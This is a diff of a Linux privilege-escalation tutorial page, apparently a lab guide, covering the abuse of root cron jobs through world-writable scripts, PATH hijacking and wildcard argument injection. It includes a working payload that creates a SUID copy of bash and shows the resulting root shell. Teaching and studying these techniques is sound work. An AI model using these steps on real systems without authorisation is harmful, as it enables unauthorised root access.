@@ -30,9 +30,8 @@ PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
 Here the top 4 jobs are pretty standard. Using the `run-parts` command they just say to run the scripts inside `/etc/cron.hourly`, `/etc/cron.daily`, `/etc/cron.weekly` and `/etc/cron.monthly`. They also say exactly when it will run, indicated by the first 5 values. The `/etc/cron.daily` directory for example runs every day at 6:25 AM, and you can see the scripts by listing them:
 
-```shell-session
-$ ls -la /etc/cron.daily
-total 60
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ls -la /etc/cron.daily
+</strong>total 60
 -rwxr-xr-x 1 root root   633 Jul 28  2015 apache2
 -rwxr-xr-x 1 root root 14799 Apr 15  2011 apt
 -rwxr-xr-x 1 root root   314 Aug 10  2011 aptitude
@@ -44,7 +43,7 @@ total 60
 -rwxr-xr-x 1 root root  1335 Jan  2  2011 man-db
 -rwxr-xr-x 1 root root   249 Feb 15  2011 passwd
 -rwxr-xr-x 1 root root  3594 Dec 18  2010 standard
-```
+</code></pre>
 
 Under those 4 directories, there are also two `overwrite.sh` and `compress.sh` scripts, which run **every minute** (indicated by the `* * * * *`). These are often interesting because they run so often, allowing us lots of chances to mess with them.&#x20;
 
@@ -56,19 +55,17 @@ You can even use `watch date` to get a date output that updates every 2 seconds,
 
 Note that the `overwrite.sh` script does not have an absolute path, so we don't know yet where it is located. But we can use the `type` command to let the system resolve the PATH and find what it would execute:
 
-```shell-session
-$ type overwrite.sh
-overwrite.sh is /usr/local/bin/overwrite.sh
-```
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ type overwrite.sh
+</strong>overwrite.sh is /usr/local/bin/overwrite.sh
+</code></pre>
 
 ## Overwriting scripts
 
 These commands are executed by root, so we better make sure to check if we can overwrite any of these scripts to let root execute any commands of ours. You can use ls to check the permissions.&#x20;
 
-```shell-session
-$ ls -la /usr/local/bin/overwrite.sh
--rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
-```
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ls -la /usr/local/bin/overwrite.sh
+</strong>-rwxr--rw- 1 root staff 40 May 13  2017 /usr/local/bin/overwrite.sh
+</code></pre>
 
 Here we can see the owner (root) has `rwx` permissions, the staff group has `r--` permissions, and everybody else has `rw-` permissions. This means we can write to this script whatever we want:
 
@@ -82,11 +79,10 @@ cp /bin/bash /tmp/bash; chmod +xs /tmp/bash
 
 Then whenever the cron job triggers, a `/tmp/bash` file is created which we can get a shell from using:
 
-```shell-session
-$ /tmp/bash -p
-# id
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ /tmp/bash -p
+</strong># id
 uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
-```
+</code></pre>
 
 ## PATH Variable
 
@@ -120,52 +116,47 @@ $ chmod +x /home/user/overwrite.sh
 
 When the cron job now triggers, the relative `overwrite.sh` command will first be found in the `/home/user` directory which we created, giving us a shell in `/tmp/bash`:
 
-```shell-session
-$ /tmp/bash -p
-# id
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ /tmp/bash -p
+</strong># id
 uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
-```
+</code></pre>
 
 ## Wildcards
 
 Bash allows you to use `*` wildcards in commands to insert any files that match the wildcard. This works by inserting all the matched files after each other separated by spaces in the command since most commands allow you to add as many files as you want by just adding more arguments.&#x20;
 
-{% code title="Example" %}
-```shell-session
-$ ls -l
-total 276
+<pre class="language-shell-session" data-title="Example"><code class="lang-shell-session"><strong>$ ls -l
+</strong>total 276
 drwxrwxr-x  2 user   user     4096 Aug 20 16:00 directory/
 -rw-rw-r--  1 user   user        0 Aug 20 16:00 first
 -rw-rw-r--  1 user   user        0 Aug 20 16:00 second
-$ file *  # Wildcard
-directory: directory
+<strong>$ file *  # Wildcard
+</strong>directory: directory
 first:     empty
 second:    empty
-$ file directory first second  # Equivalent
-directory: directory
+<strong>$ file directory first second  # Equivalent
+</strong>directory: directory
 first:     empty
 second:    empty
-```
-{% endcode %}
+</code></pre>
 
 The problem arises when you can create files starting with `-`, which are often flags to change the behavior of a command. Bash just pastes the files into the command, not bothering to check if any of them start with the `-` dash. This means we can add flags to the command and make it do different things.&#x20;
 
 With the `file` command, for example, something innocent we can do is use the `-F` option to change the `:` separator we saw earlier. Arguments often don't need a space character, so we can just create a file called `-Fsomething` to add this argument to the file command if the wildcard is used. Another common way to pass arguments is by using the `=` equals sign for `--` arguments, like `--separator=something`. Here are two examples:
 
-```shell-session
-$ touch -- -Fsomething  # Attack
-$ file *
-directorysomething directory
+<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ touch -- -Fsomething  # Attack
+</strong><strong>$ file *
+</strong>directorysomething directory
 firstsomething     empty
 secondsomething    empty
-$ rm -- -Fsomething  # Remove previous attack
-
-$ touch -- --separator=something  # Other attack
-$ file *
-directorysomething directory
+<strong>$ rm -- -Fsomething  # Remove previous attack
+</strong>
+<strong>$ touch -- --separator=something  # Other attack
+</strong><strong>$ file *
+</strong>directorysomething directory
 firstsomething     empty
 secondsomething    empty
-```
+</code></pre>
 
 {% hint style="info" %}
 **Tip**: Use the `--` characters alone to not interpret the following arguments as flags. This is how you should secure a wildcard vulnerability like this, and also how you can easily place your payload using without `touch` thinking they're flags too.&#x20;
